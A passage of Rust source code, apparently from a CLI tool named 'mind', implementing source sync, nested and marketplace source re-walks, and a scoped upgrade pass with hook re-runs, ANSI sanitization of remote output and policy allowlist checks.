                // spec: DSC-94 -- B4: sanitize at the sync-time re-read too.
                let desc = MindToml::load(&dir)?
                    .and_then(|mt| mt.source.description)
                    .map(|d| strip_ansi(&d));
                return Ok((new_commit, changed, desc));
            }
            // CLI-55: resolve the source against its recorded pin (never change
            // the pin itself, only move HEAD to the pinned point).
            let pin = source.pin.clone();
            if dir.join(".git").is_dir() {
                git::sync_to_pin(&source.url, &dir, &pin)?;
            } else {
                if let Some(parent) = dir.parent() {
                    crate::paths::mkdir_p(parent)?;
                }
                git::clone_at(&source.url, &dir, &pin)?;
            }
            let new_commit = git::head_commit(&source.url, &dir)?;
            let changed = source.commit.as_deref() != Some(new_commit.as_str());
            // spec: DSC-94 -- B4: sanitize at the sync-time re-read too.
            let desc = MindToml::load(&dir)?
                .and_then(|mt| mt.source.description)
                .map(|d| strip_ansi(&d));
            Ok((new_commit, changed, desc))
        })();
        match refreshed {
            Ok((new_commit, changed, desc)) => {
                source.commit = Some(new_commit.clone());
                source.description = desc;
                synced += 1;
                if !out.json {
                    let label = if changed {
                        out.green("updated")
                    } else {
                        out.dim("up to date")
                    };
                    println!("{} ({})", label, short(&new_commit));
                }
            }
            Err(e) => {
                if !out.json {
                    println!("{}", out.red("failed"));
                    // spec: CLI-186 -- sanitize git stderr before printing to
                    // prevent ANSI/bidi injection from a hostile remote.
                    let safe_e = strip_ansi(&e.to_string());
                    eprintln!("  {} {}: {safe_e}", out.err(), source.name);
                    // spec: CLI-177, CLI-178 -- auth and proxy hints on a direct
                    // per-source sync git failure, mirroring the meld top-level hints.
                    if git::is_auth_failure(&e) && !source.is_local() {
                        for line in git::auth_hint_lines(&source.ssh_url()) {
                            eprintln!("{line}");
                        }
                    } else if git::is_proxy_failure(&e) {
                        for line in git::proxy_hint_lines() {
                            eprintln!("{line}");
                        }
                    }
                }
                failures.push(source.name.clone());
            }
        }
    }
    // Save the progress made before reporting any failure, so the recorded
    // commits stay consistent with what is on disk.
    registry.save(paths)?;

    // DSC-57: re-walk each registered source's refreshed `[discover].sources` and
    // meld any newly-listed nested source not already registered. Register-only
    // (the DSC-54 default; nested items are not installed) and cycle-safe by the
    // DSC-38 guards. Only adds; a nested source dropped upstream stays registered.
    //
    // spec: CLI-231 -- skipped for a targeted `sync <source>`: discovering and
    // melding new nested sources is a whole-set operation, not part of fetching
    // one named source.
    if source_selector.is_none() {
        // Collect the nested specs now, before mutably borrowing the registry.
        // DSC-61: carry each entry's curator-supplied configuration so a newly
        // discovered nested source is melded with the same gate/apply behavior as
        // a fresh meld. Hooks resolve against the super-source's mind.toml path.
        struct NestedTodo {
            spec: String,
            alias: Option<String>,
            curated: CuratedConfig,
            /// The entry's declared item-link kind (DSC-100), carried so a
            /// re-walk registers a curated file link exactly as a fresh meld
            /// would.
            item_kind: Option<ItemKind>,
            /// The curator whose list named this entry (STO-82), recorded on
            /// the source the re-walk registers.
            curator: String,
            /// Auth-failure policy for this entry (DSC-68). Carried so the re-walk
            /// loop can handle auth failures the same way as meld (DSC-68 requires
            /// the same behavior applies during sync).
            on_auth_failure: Option<crate::mindfile::OnAuthFailure>,
        }
        let mut nested: Vec<NestedTodo> = Vec::new();
        for s in &registry.sources {
            // spec: LNK-8 -- an item-link instance curates nothing; its repo's
            // [discover].sources is not walked.
            if s.item_path.is_some() {
                continue;
            }
            let clone_dir = s.clone_dir(paths);
            let toml_path = clone_dir.join("mind.toml");
            let Some(mt) = MindToml::load(&clone_dir).ok().flatten() else {
                continue;
            };
            let Some(discover) = mt.discover else {
                continue;
            };
            for ns in discover.sources {
                let curated = CuratedConfig {
                    pin: ns.pin_directive(&toml_path)?,
                    roots: ns.roots.clone(),
                    // spec: DSC-88 -- gated by DSC-60 exactly like `roots`, so a
                    // re-walk applies the same gate a fresh meld would; it is
                    // NOT threaded as a consumer `--add-root` override anymore.
                    add_roots: ns.add_roots.clone(),
                    flat_skills: ns.flat_skills,
                    hooks: ns.resolved_hooks(&toml_path)?,
                };
                // spec: DSC-78 — use effective_alias() so the canonical
                // `namespace =` key is honored (not just the legacy `as =` key).
                // Compute before consuming fields of `ns`.
                let ns_alias = ns.effective_alias();
                // spec: DSC-100 -- the entry's `kind =`, same parse as meld's.
                let ns_kind = ns.item_kind(&toml_path)?;
                nested.push(NestedTodo {
                    spec: ns.source,
                    alias: ns_alias,
                    curated,
                    item_kind: ns_kind,
                    curator: s.name.clone(), // spec: STO-82
                    on_auth_failure: ns.on_auth_failure,
                });
            }
        }
        // MKT-7/DSC-57: also re-walk .claude-plugin/marketplace.json from registered
        // sources. For each marketplace source, add newly-listed plugin entries that
        // are not already registered. Additive only: a removed entry stays registered
        // (removal is an explicit `unmeld`). Cycle-safe via the visited set below.
        for s in &registry.sources {
            // spec: LNK-8 -- an item-link instance's marketplace manifest (if
            // its repo ships one) is bypassed, not re-walked.
            if s.item_path.is_some() {
                continue;
            }
            let clone_dir = s.clone_dir(paths);
            // An authoritative mind.toml suppresses the marketplace manifest (MKT-2).
            let is_authoritative_source = MindToml::load(&clone_dir)
                .ok()
                .flatten()
                .is_some_and(|m| m.is_authoritative());
            if is_authoritative_source {
                continue;
            }
            let marketplace_path = plugin_manifest::marketplace_manifest_path(&clone_dir);
            if !marketplace_path.is_file() {
                continue;
            }
            // Skip parse errors during sync re-walk (advisory; a bad manifest
            // was already surfaced at meld time).
            let Ok(manifest) = plugin_manifest::load_marketplace_manifest(&marketplace_path) else {
                continue;
            };
            for entry in manifest.into_entries() {
                // In-repo plugins are scan roots in catalog.rs, not sub-melded. spec: MKT-14
                if matches!(entry.source, plugin_manifest::PluginSource::InRepo { .. }) {
                    continue;
                }
                let repo_spec = marketplace_entry_spec(&entry, &clone_dir);
                nested.push(NestedTodo {
                    spec: repo_spec,
                    alias: Some(entry.name),
                    // A marketplace entry carries no curator add-root override.
                    curated: CuratedConfig {
                        pin: None,
                        roots: None,
                        add_roots: None,
                        flat_skills: false,
                        hooks: Vec::new(),
                    },
                    item_kind: None, // a marketplace entry is a repo, never an item link
                    curator: s.name.clone(), // spec: STO-82 (MKT-7)
                    on_auth_failure: None,
                });
            }
        }

        // Seed the cycle guard with every registered source so an existing one
        // is skipped without a clone attempt (same identity+URL key as
        // meld_recursive).
        let mut visited: HashSet<String> = registry
            .sources
            .iter()
            .map(|s| format!("{}|{}", s.name, s.url))
            .collect();
        let mut discovered = 0usize;
        for todo in nested {
            // spec: STO-58 -- resolve the nested source under its effective alias
            // so an already-registered aliased instance is recognized.
            // spec: CLI-216 -- the already-registered guard is a lookup; the
            // meld_recursive call below is the parse that may clone.
            if let Ok(mut s) = parse_spec_quiet(&todo.spec)
                && {
                    s.apply_alias(todo.alias.clone());
                    true
                }
                && registry.find(&s.name).is_some()
            {
                continue;
            }
            // spec: DSC-68 -- auth failures during the sync re-walk honor
            // on-auth-failure the same way as the nested-source loop in
            // meld_recursive. Without on-auth-failure, the error propagates
            // as a generic git error (hard failure).
            let todo_alias = todo.alias.clone();
            let todo_kind = todo.item_kind;
            let todo_curator = todo.curator.clone();
            match meld_recursive(
                paths,
                &mut registry,
                &todo.spec,
                todo.alias,
                vec![],
                vec![], // spec: DSC-88 -- add-roots is gated; carried via todo.curated below
                false,  // no consumer --flat-skills on a sync re-walk (curator config supplies it)
                PinRequest::None,
                false,
                &mut visited,
                policy.as_ref(),
                None,  // a re-walked nested source supplies no install hook
                false, // sync is non-TTY: its hooks take the HOOK-22 skip path
                prefer_ssh,
                true, // sync re-walk is non-interactive (no collision prompt)
                Some(todo.curated),
                &mut sync_skipped,
                todo_kind,          // spec: DSC-100
                Some(todo_curator), // spec: STO-82
            ) {
                Ok(n) => discovered += n,
                Err(e) if git::is_auth_failure(&e) => {
                    // spec: STO-58 -- match the aliased identity the nested source
                    // registers under.
                    // spec: CLI-216 -- quiet: naming a clone that already failed.
                    let entry_name = parse_spec_quiet(&todo.spec)
                        .map(|mut s| {
                            s.apply_alias(todo_alias.clone());
                            s.name
                        })
                        .unwrap_or_else(|_| todo.spec.clone());
                    // spec: DSC-70 -- on-auth-failure only covers the entry's own
                    // clone failure. If the entry is already in the registry, it
                    // cloned successfully and the failure came from a descendant;
                    // propagate it unchanged.
                    if registry.find(&entry_name).is_some() {
                        return Err(e);
                    }
                    let Some(cfg) = &todo.on_auth_failure else {
                        return Err(e);
                    };
                    // spec: DSC-69 -- always warn to stderr regardless of --json mode
                    for line in auth_failure_lines(&entry_name, cfg) {
                        eprintln!("{line}");
                    }
                    if cfg.action == AuthFailureAction::Skip {
                        sync_skipped.push(SkippedEntry {
                            source: entry_name,
                            reason: "auth_failure".into(),
                        });
                        continue;
                    }
                    return Err(e);
                }
                // spec: DSC-79 -- the same non-auth clone-failure skip applies during
                // the sync re-walk. No curator-empty guard here: the source is already
                // melded, so DSC-80 does not apply.
                Err(e) => {
                    // spec: STO-58 -- match the aliased identity the nested source
                    // registers under.
                    // spec: CLI-216 -- quiet: naming a clone that already failed.
                    let entry_name = parse_spec_quiet(&todo.spec)
                        .map(|mut s| {
                            s.apply_alias(todo_alias.clone());
                            s.name
                        })
                        .unwrap_or_else(|_| todo.spec.clone());
                    if registry.find(&entry_name).is_some() {
                        return Err(e);
                    }
                    for line in clone_failure_lines(&entry_name, &e) {
                        eprintln!("{line}");
                    }
                    sync_skipped.push(SkippedEntry {
                        source: entry_name,
                        reason: "clone_failure".into(),
                    });
                    continue;
                }
            }
        }
        if discovered > 0 {
            registry.save(paths)?;
        }
    }

    // spec: POL-34 -- combine per-source and provisioning failures so either
    // kind causes a non-zero exit. total includes the failed provisioning entries
    // (they are not in registry.sources because they never landed).
    let total_failed = failures.len() + provision_failures.len();
    if total_failed > 0 {
        return Err(MindError::SyncFailed {
            failed: total_failed,
            total: total + provision_failures.len(),
        });
    }
    let mut upgraded: Vec<String> = Vec::new();
    if then_upgrade {
        // spec: HOOK-11, HOOK-23 - sync already done above; run the pass with
        // no_sync to avoid a redundant fetch. Deprecated: prefer `mind upgrade`
        // (CLI-169).
        // spec: CLI-217 -- `upgrade_inner_scoped` (not the `upgrade_no_sync`
        // wrapper) so the pass does not emit its own document: the caller
        // invoked `sync`, and what the pass applied is folded into sync's one
        // object below.
        // spec: CLI-232 -- H2 fix: thread `selected` (the `[source]` selector
        // already resolved above) through as the upgrade pass's source scope,
        // so `sync <source> --upgrade` upgrades (and re-runs install hooks
        // for, HOOK-11) only the named source(s), not every installed item
        // from every melded source.
        // spec: CLI-235 -- also thread the raw `source_selector` TEXT (not
        // just the names it resolved to) so the multi-source disclosure can
        // echo the filter that did the matching (M19).
        let pass = upgrade_inner_scoped(
            paths,
            yes,
            None,
            true,
            selected.as_deref(),
            source_selector,
            None,
            dangerously_skip_hook_check,
            dangerously_skip_build_hook_check,
        )?;
        if let Some(result) = pass {
            upgraded = result.installed;
        }
    }
    // spec: CLI-217 -- emitted AFTER the `--upgrade` pass, not before it. The
    // invoked verb is `sync`, so sync's object is the one the caller is
    // answered with; printed first, the pass's own object came last on stdout
    // (two documents, which no single-value JSON parse accepts), and a failing
    // pass left sync's result on stdout ahead of the CLI-181 error envelope.
    if out.json {
        let mut result = MutationResult::new("sync", "", "synced");
        result.count = Some(synced);
        result.skipped = sync_skipped;
        // Everything this run installed or re-installed: the POL-58 auto_meld
        // provisioning pass, then the `--upgrade` pass.
        //
        // spec: DSC-95 -- `provisioned_keys` rides off `learn_collecting`'s
        // raw (unsanitized) keys (via `install_provisioned_items`); sanitize
        // before assigning to the `--json` field. `upgraded` is already
        // sanitized (`upgrade_inner_scoped` pushes `display_key()`).
        result.installed = provisioned_keys.iter().map(|k| strip_ansi(k)).collect();
        result.installed.extend(upgraded);
        print_json(&result)?;
    }
    Ok(())
}

/// Sync sources relevant to the upgrade scope. Per-source failures are reported
/// and skipped (CLI-54 resilience); the upgrade pass uses whatever was refreshed.
// spec: CLI-169
pub(crate) fn sync_sources_for_upgrade(
    paths: &Paths,
    registry: &mut Registry,
    item_ref: Option<&str>,
    out: &crate::render::OutputCtx,
) -> Result<()> {
    // Determine which source names are in scope. With no filter, all sources sync.
    let in_scope: Option<HashSet<String>> =
        item_ref.and_then(|r| parse_item_ref(r).ok()).map(|f| {
            Manifest::load(paths)
                .map(|m| {
                    m.items
                        .values()
                        .filter(|it| crate::resolve::installed_matches_glob(it, &f))
                        .map(|it| it.source.clone())
                        .collect()
                })
                .unwrap_or_default()
        });

    let should_sync = |name: &str| in_scope.as_ref().is_none_or(|s| s.contains(name));

    for source in &mut registry.sources {
        if !should_sync(&source.name) {
            continue;
        }
        let refreshed = (|| -> Result<(String, bool)> {
            // spec: STO-69 -- validate before any fetch/clone/delete touches it.
            let dir = clone_dir_checked(paths, source)?;
            if source.is_linked() {
                if !dir.is_dir() {
                    return Err(MindError::NotADirectory {
                        path: dir.display().to_string(),
                    });
                }
                let new_commit = git::head_commit(&source.url, &dir)
                    .ok()
                    .or_else(|| source.commit.clone())
                    .unwrap_or_default();
                let changed = source.commit.as_deref() != Some(new_commit.as_str());
                return Ok((new_commit, changed));
            }
            let pin = source.pin.clone();
            if dir.join(".git").is_dir() {
                git::sync_to_pin(&source.url, &dir, &pin)?;
            } else {
                if let Some(parent) = dir.parent() {
                    crate::paths::mkdir_p(parent)?;
                }
                git::clone_at(&source.url, &dir, &pin)?;
            }
            let new_commit = git::head_commit(&source.url, &dir)?;
            let changed = source.commit.as_deref() != Some(new_commit.as_str());
            Ok((new_commit, changed))
        })();
        match refreshed {
            Ok((new_commit, _)) => {
                source.commit = Some(new_commit);
            }
            Err(e) => {
                if !out.json {
                    eprintln!(
                        "  warning: could not sync {}: {e}; upgrade will use stale clone",
                        source.name
                    );
                }
            }
        }
    }
    // Persist whatever was refreshed before the upgrade pass reads the registry.
    registry.save(paths)?;
    Ok(())
}

/// `mind upgrade [--yes] [item]` — report and optionally apply upgrades.
///
/// Syncs first by default (CLI-169).
pub fn upgrade(
    paths: &Paths,
    yes: bool,
    item_ref: Option<&str>,
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<()> {
    emit_upgrade_result(upgrade_inner(
        paths,
        yes,
        item_ref,
        false,
        dangerously_skip_hook_check,
        dangerously_skip_build_hook_check,
    )?)
}

/// `mind upgrade --no-sync` — skip the pre-upgrade source fetch (CLI-169).
pub fn upgrade_no_sync(
    paths: &Paths,
    yes: bool,
    item_ref: Option<&str>,
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<()> {
    emit_upgrade_result(upgrade_inner(
        paths,
        yes,
        item_ref,
        true,
        dangerously_skip_hook_check,
        dangerously_skip_build_hook_check,
    )?)
}

/// An upgrade pass restricted to a set of SOURCE identities, with the pre-pass
/// fetch already done by the caller (`no_sync`).
///
/// What `curate` applies for its `upgrade` changes (curate.md CUR-6): the
/// ordinary pass (CLI-53), scoped so an item installed from a directly-melded
/// source is never touched by a command about curated ones. `sync <source>
/// --upgrade` reaches the same scoped pass through `source_scope` (CLI-232);
/// this wrapper differs only in skipping the fetch, which `curate` has already
/// performed for the whole curated set (CUR-2).
pub(crate) fn upgrade_sources_no_sync(
    paths: &Paths,
    yes: bool,
    sources: &[String],
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<()> {
    emit_upgrade_result(upgrade_inner_scoped(
        paths,
        yes,
        None,
        true,
        Some(sources),
        None,
        None,
        dangerously_skip_hook_check,
        dangerously_skip_build_hook_check,
    )?)
}

/// Register one `[discover].sources` entry of `curator`, exactly as the meld
/// nested loop and the DSC-57 re-walk do (curate.md CUR-3).
///
/// Register-only: the entry's declared items are installed by the caller's
/// install pass (CUR-4), so this is the registration half alone. Returns how
/// many sources it added (0 when the entry was already registered, or was
/// skipped).
#[allow(clippy::too_many_arguments)]
pub(crate) fn meld_curated_entry(
    paths: &Paths,
    registry: &mut Registry,
    curator: &str,
    toml_path: &std::path::Path,
    entry: &crate::mindfile::NestedSource,
    policy: Option<&Policy>,
    prefer_ssh: bool,
    dangerously_skip_hook_check: bool,
    skipped: &mut Vec<SkippedEntry>,
) -> Result<usize> {
    entry.validate(toml_path)?; // spec: DSC-64
    let curated = curated_config_for(entry, toml_path)?;
    let item_kind = entry.item_kind(toml_path)?; // spec: DSC-100
    let mut visited: HashSet<String> = registry
        .sources
        .iter()
        .map(|s| format!("{}|{}", s.name, s.url))
        .collect();
    meld_recursive(
        paths,
        registry,
        &entry.source,
        entry.effective_alias(), // spec: DSC-78
        vec![],
        vec![],
        false,
        PinRequest::None, // the curator's directive supplies the pin (DSC-65)
        false,            // nested, not top-level
        &mut visited,
        policy,
        None, // no consumer install hook
        dangerously_skip_hook_check,
        prefer_ssh,
        true, // non-interactive: `curate` has already taken the user's decision
        Some(curated),
        skipped,
        item_kind,
        Some(curator.to_string()), // spec: STO-82
    )
}

/// A no-sync upgrade restricted to an explicit set of item KEYS (`kind:name`),
/// exact match rather than the glob `item_ref` restricts by (TUI-72, TUI-73).
///
/// This is what the TUI's `u` action applies: `app.rs`'s `initiate_upgrade`
/// stashes the exact keys its confirm modal listed onto the pending action, and
/// this is what applies exactly that set, so the applied set equals the
/// confirmed set BY CONSTRUCTION rather than by two independent computations
/// (the confirm-time recompute and the apply-time re-hash) happening to agree.
/// Never fetches (`no_sync = true`, mirroring `upgrade_no_sync`): the TUI
/// offers `s` (Sync) and a ~1s re-poll separately, so refreshing drift is not
/// this call's job.
///
/// A confirmed key that is no longer applicable by the time this runs -- no
/// longer installed (forgotten), no longer has a matching catalog item (its
/// source was unmelded), or no longer out of date (already resolved by a
/// concurrent upgrade, or the edit that caused the drift was reverted) -- is
/// silently skipped, exactly like an out-of-scope item is for a glob-filtered
/// `mind upgrade <item>`: the confirm-to-apply window is real and a benign
/// race must not abort the whole batch. The report (and the TUI's captured
/// status line) simply reflects whatever subset of `keys` is still applicable;
/// when that subset is empty this prints the ordinary "everything is up to
/// date" the CLI already uses, not an error.
// spec: TUI-72 TUI-73
pub fn upgrade_no_sync_keys(
    paths: &Paths,
    yes: bool,
    keys: &[String],
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<()> {
    emit_upgrade_result(upgrade_inner_scoped(
        paths,
        yes,
        None,
        true,
        None,
        None,
        Some(keys),
        dangerously_skip_hook_check,
        dangerously_skip_build_hook_check,
    )?)
}

/// Emit an upgrade pass's result when `upgrade` was the verb the user invoked.
///
/// `upgrade_inner` RETURNS its `--json` result rather than printing it, because
/// it is also the `--upgrade` pass inside `sync`, where the caller invoked
/// `sync` and CLI-217 allows exactly one document. Only these two wrappers --
/// the real `upgrade` verb -- print it.
// spec: CLI-217
fn emit_upgrade_result(result: Option<MutationResult>) -> Result<()> {
    match result {
        Some(r) => print_json(&r),
        None => Ok(()),
    }
}

/// The upgrade pass. Returns the `--json` result object (`None` in text mode,
/// or when the pass ended on a path with nothing to report) for the caller to
/// emit or fold into its own; see [`emit_upgrade_result`].
fn upgrade_inner(
    paths: &Paths,
    yes: bool,
    item_ref: Option<&str>,
    no_sync: bool,
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<Option<MutationResult>> {
    upgrade_inner_scoped(
        paths,
        yes,
        item_ref,
        no_sync,
        None,
        None,
        None,
        dangerously_skip_hook_check,
        dangerously_skip_build_hook_check,
    )
}

/// The upgrade pass, additionally restricted to a `source_scope` (CLI-232, H2
/// fix) and/or a `key_scope` (TUI-72, TUI-73). `source_scope` is threaded from
/// `sync <source> --upgrade`'s already-computed selector (`sync_inner`'s
/// `selected`): `None` means every source is in scope (unscoped `mind
/// upgrade`, unchanged); `Some(names)` restricts both the per-item delta loop
/// AND the HOOK-11 install-hook re-run to sources in `names`, so `sync
/// <source> --upgrade` cannot silently upgrade items from (or re-run install
/// hooks for, HOOK-11) a source the caller never named. `source_filter_desc`
/// is the raw filter TEXT that produced `source_scope` (the `sync <source>`
/// selector string), used only to echo it in the CLI-234/CLI-235 disclosure
/// below (M19); `item_ref` doubles as its own filter text when given (the
/// `upgrade <item>` case), so callers with an `item_ref` pass `None` here.
/// `key_scope` is the analogous restriction by exact item KEY (`kind:name`)
/// rather than by source or by `item_ref` glob, threaded from the TUI's
/// confirmed-set apply (`upgrade_no_sync_keys`); `None` means unrestricted by
/// key (every other caller, unchanged).
#[allow(clippy::too_many_arguments)]
fn upgrade_inner_scoped(
    paths: &Paths,
    yes: bool,
    item_ref: Option<&str>,
    no_sync: bool,
    source_scope: Option<&[String]>,
    source_filter_desc: Option<&str>,
    key_scope: Option<&[String]>,
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<Option<MutationResult>> {
    let out = crate::render::ctx();
    // POL-3: load the managed policy once (fail closed on Err; None = inert).
    let policy = Policy::load()?;
    let mut registry = Registry::load(paths)?;

    // spec: CLI-169 - sync each involved source before computing deltas, unless
    // --no-sync is given. Per-source failures are reported and skipped (CLI-54);
    // the upgrade pass runs on the sources that did succeed.
    if !no_sync {
        sync_sources_for_upgrade(paths, &mut registry, item_ref, &out)?;
    }

    let manifest = Manifest::load(paths)?;

    let filter = item_ref.map(parse_item_ref).transpose()?;
    let source_scope: Option<HashSet<String>> =
        source_scope.map(|names| names.iter().cloned().collect());
    // spec: TUI-72 TUI-73 - the TUI's confirmed-key scope (exact `kind:name`
    // match), analogous to `source_scope` but by item identity rather than by
    // source or by `filter`'s glob.
    let key_scope: Option<HashSet<String>> = key_scope.map(|keys| keys.iter().cloned().collect());

    // HOOK-11 scope: a scoped `upgrade <item>` (or a scoped `sync <source>
    // --upgrade`, CLI-232, or a scoped TUI key-set apply, TUI-73) must not
    // re-run install hooks (arbitrary code) for sources unrelated to the
    // targeted item/source. When a filter is present, restrict the hook
    // re-run to sources that have at least one INSTALLED item matching the
    // filter (the same scoping the per-item loop uses via
    // `installed_matches_glob`); same for a key scope, restricted to sources
    // that have at least one installed item whose KEY is in the set; when a
    // source scope is present, intersect with it too (a `sync <source>
    // --upgrade` names the source directly). With none of the three, `None`
    // means every source is in scope, leaving the unscoped behavior unchanged.
    let from_filter: Option<HashSet<String>> = filter.as_ref().map(|f| {
        manifest
            .items
            .values()
            .filter(|it| crate::resolve::installed_matches_glob(it, f))
            .map(|it| it.source.clone())
            .collect::<HashSet<String>>()
    });
    let from_keys: Option<HashSet<String>> = key_scope.as_ref().map(|keys| {
        manifest
            .items
            .values()
            .filter(|it| keys.contains(it.key().as_str()))
            .map(|it| it.source.clone())
            .collect::<HashSet<String>>()
    });

    // spec: CLI-234 -- the multi-source disclosure's scope is the UNION of
    // every scoping mechanism in play (a filter, a source scope, or a key
    // scope), computed here BEFORE `hook_scope` below consumes `from_filter`/
    // `from_keys` by moving them into its (intersecting, not union-ing)
    // candidate set. `CLI-233`'s original form derived the note's names from
    // `source_scope` alone (the `sync <filter> --upgrade` case only), so
    // `upgrade '<suffix>#*'` -- an identical HOOK-11 blast radius, every
    // matched source's items upgraded and its install hook possibly re-run --
    // never populated it: `source_scope` is always `None` for a plain
    // `upgrade <item>` call, so `scope_names` stayed empty and the note never
    // fired no matter how many sources the item-ref filter actually matched.
    let scope_names: Vec<String> = {
        let mut set: HashSet<String> = HashSet::new();
        for s in [
            from_filter.as_ref(),
            source_scope.as_ref(),
            from_keys.as_ref(),
        ]
        .into_iter()
        .flatten()
        {
            set.extend(s.iter().cloned());
        }
        let mut v: Vec<String> = set.into_iter().collect();
        v.sort();
        v
    };
    // spec: CLI-235 -- the raw filter TEXT to echo in the note (M19): an
    // `item_ref` (the `upgrade <item>` case) doubles as its own filter text;
    // otherwise fall back to `source_filter_desc` (the `sync <source>`
    // selector string). Both `None` for the TUI's key-scoped apply, which has
    // no textual filter to echo.
    let filter_desc = item_ref.or(source_filter_desc);
    let multi_source_note = multi_source_upgrade_note(&scope_names, filter_desc);
    // spec: CLI-235 -- hoisted ABOVE `rerun_source_hooks` and unconditional on
    // `yes`/`pending` (M1: this used to print only from inside the `!yes`
    // confirmation block below, which is reached AFTER `rerun_source_hooks`
    // already ran -- future-tense wording ("possibly re-running") describing
    // a side effect already taken -- and only when a pending upgrade existed;
    // a re-run that found nothing pending, or any `--yes` run, never
    // disclosed the multi-source blast radius at all). Fires whenever the
    // scope spans more than one source, independent of `pending`/`yes`.
    // `--json`'s stdout carries exactly one JSON document (tests/json_stdout.rs),
    // so the disclosure goes to stderr there instead of stdout (also covers
    // `--json --yes`, which has no `ConfirmationRequired` to carry it at
    // all); text mode prints it directly. The `!yes` `--json` refusal further
    // below still folds this same note into `ConfirmationRequired.action`
    // (CLI-233, unchanged), so a `--json` caller without `--yes` sees it
    // through that channel too.
    if let Some(note) = &multi_source_note {
        if out.json {
            eprintln!("{} {note}", out.warn());
        } else {
            println!("  {} {note}", out.warn());
        }
    }

    let hook_scope: Option<HashSet<String>> = {
        let candidates: Vec<HashSet<String>> = [from_filter, source_scope.clone(), from_keys]
            .into_iter()
            .flatten()
            .collect();
        let mut candidates = candidates.into_iter();
        candidates
            .next()
            .map(|first| candidates.fold(first, |acc, c| acc.intersection(&c).cloned().collect()))
    };

    // HOOK-11, HOOK-121, HOOK-122: run each source's pending source-level hooks
    // for this update -- its update hooks when it declares any, else its
    // recorded install hooks -- when the commit has advanced past the commit the
    // hook last ran at (or it was recorded but never run). This is a
    // source-level pass, separate from the per-item upgrade loop below.
    rerun_source_hooks(
        paths,
        &mut registry,
        dangerously_skip_hook_check,
        hook_scope.as_ref(),
        policy.as_ref(),
    )?;

    // spec: CLI-211 -- a source that cannot be scanned (missing clone, or any
    // other per-source scan failure) must not silently drop its items out of
    // the delta computation and leave the run reporting "up to date". Scan
    // each source independently, name every one that failed, and remember
    // them so the final report cannot claim everything is up to date while a
    // source was never actually checked.
    let mut catalog: Vec<CatalogItem> = Vec::new();
    let mut unscannable: Vec<String> = Vec::new();
    for s in &registry.sources {
        if let Err(e) = catalog::scan_source(paths, s, &mut catalog) {
            unscannable.push(s.name.clone());
            if !out.json {
                let safe_e = strip_ansi(&e.to_string());
                eprintln!(
                    "{} could not check {}: {safe_e}; run `mind sync` or `mind introspect` to diagnose",
                    out.warn(),
                    s.name
                );
            }
        }
    }
    let mut pending: Vec<Upgrade> = Vec::new();

    for installed in manifest.items.values() {
        match upgrade_item_disposition(
            installed,
            filter.as_ref(),
            source_scope.as_ref(),
            key_scope.as_ref(),
            policy.as_ref(),
            &registry,
        ) {
            // Out of the scoped selection: silent skip, no output.
            UpgradeDisposition::OutOfScope => continue,
            // POL-12: in-scope but the source is no longer allowed by the locked
            // allowlist; report and skip. The item-ref filter is checked first,
            // so a scoped upgrade never emits skip lines for out-of-scope sources
            // the user never selected.
            UpgradeDisposition::PolicyBlocked => {
                if !out.json {
                    // spec: DSC-95
                    println!(
                        "{} skipping {} from {}: source not permitted by the managed policy's allowlist",
                        out.warn(),
                        installed.display_key(),
                        strip_ansi(&installed.source)
                    );
                }
                continue;
            }
            // spec: POL-69 -- the item's recorded source isn't registered at
            // all (it was unmelded, or never melded under that name); say so
            // instead of the misleading "not permitted by the allowlist",
            // and point at `introspect` to diagnose the drift.
            UpgradeDisposition::SourceNotRegistered => {
                if !out.json {
                    // spec: DSC-95
                    println!(
                        "{} skipping {} from {}: source is not registered (not currently melded); run `mind introspect` to check for drift",
                        out.warn(),
                        installed.display_key(),
                        strip_ansi(&installed.source)
                    );
                }
                continue;
            }
            UpgradeDisposition::Consider => {}
        }
        // Match on stable identity (source, kind, bare_name) so a prefix change
        // is seen as a rename of the same item, not an orphan-plus-new-item.
        let Some(cat) = catalog.iter().find(|c| {
            c.kind == installed.kind
                && c.name == installed.bare_name
                && c.source == installed.source
        }) else {
            // Source dropped or item removed upstream; reported by introspect.
            continue;
        };
        let new_hash = cat.content_hash()?;
        let new_name = cat.effective_name();
        let new_commit = registry
            .find(&installed.source)
            .and_then(|s| s.commit.clone())
            .unwrap_or_default();
        let renamed = new_name != installed.name;
        if new_hash != installed.hash || renamed {
            pending.push(Upgrade {
                cat: cat.clone(),
                old: installed.clone(),
                new_commit,
                new_hash,
                new_name,
            });
        }
    }

    // spec: LIFE-46 -- B2: a rename must never evict a DIFFERENT item that
    // already occupies the new effective key. A third-party source edit (e.g.
    // dropping its prefix) can otherwise make one source's upgrade delete
    // another source's installed item -- no hook, no prompt (verified: two
    // sources both shipping a `review` skill, one prefixed). Mirror `learn`'s
    // `colliding_install` guard (DEP-23/NS-41): refuse rather than clobber
    // when the manifest already holds a DIFFERENT stable identity
    // `(source, kind, bare_name)` under the rename's target key.
    let target = item_ref.unwrap_or("all");

    if pending.is_empty() {
        // spec: CLI-211 -- an unscannable source makes "up to date" a lie: the
        // items it would have contributed were never compared. Report the
        // sources that could not be checked instead of the plain up-to-date line.
        if !unscannable.is_empty() {
            if out.json {
                let mut result = MutationResult::new("upgrade", target, "incomplete");
                result.count = Some(unscannable.len());
                return Ok(Some(result));
            }
            println!(
                "no pending upgrades among the source(s) that could be checked; {} source(s) could not be checked: {}",
                unscannable.len(),
                unscannable.join(", ")
            );
            return Ok(None);
        }
        if out.json {
            return Ok(Some(MutationResult::new("upgrade", target, "up-to-date")));
        }
        println!("everything is up to date");
        return Ok(None);
    }

    if !out.json {
        print_upgrade_report(&registry, &pending);
    }

    // spec: LIFE-46 CLI-232 -- these two collision checks used to run BEFORE
    // the pending report above, so a batch that hit either collision aborted
    // with no visibility into what else was pending. They now run after the
    // report so a human run always sees the full pending list first, even
    // when it then aborts. Both raise `UpgradeRenameCollision`, which (unlike
    // `AmbiguousItem`) names the collision explicitly and states both real
    // remedies (`mind forget`, re-namespace with `mind meld -N`) rather than
    // phrasing it as a "query" the user never typed with no next step.
    for up in &pending {
        if up.new_name == up.old.name {
            continue;
        }
